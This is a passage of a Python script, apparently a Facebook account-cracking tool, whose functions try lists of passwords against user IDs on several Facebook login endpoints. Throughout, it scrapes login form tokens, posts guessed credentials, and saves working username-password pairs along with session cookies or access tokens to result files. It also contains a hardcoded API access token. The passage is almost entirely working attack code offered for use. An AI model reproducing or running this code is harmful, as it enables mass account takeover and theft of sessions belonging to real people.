            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://m.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fm.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[fir-Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack D.Facebook.Com
def crack(ids, uid, pwx, **kwargs):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            ses = requests.Session()
            ses.headers.update({"origin": "https://d.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "d.facebook.com", "referer": "https://d.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://d.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://d.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fd.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[MAHDI-Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack B-api.Facebook.com
def api(ids, uid, pwx):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            ses = requests.Session()
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
            send = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)
            if 'session_key' in send.text and 'EAAA' in send.text:
                print("\r\x1b[1;92m[firI-Ok] %s|%s %s\x1b[1;97m"%(uid, pw, send.json()['access_token']))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif 'www.facebook.com' in send.json()['error_msg']:
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack X.Facebook.com
def crack2(ids, uid, pwx, **kwargs):
    global loop, uas, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            ses = requests.Session()
            ses.headers.update({"origin": "https://x.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "x.facebook.com", "referer": "https://x.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://x.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://x.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fx.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[fir-Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[fir-Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass

if __name__=='__main__':
	os.system("git pull")
	___menu___()
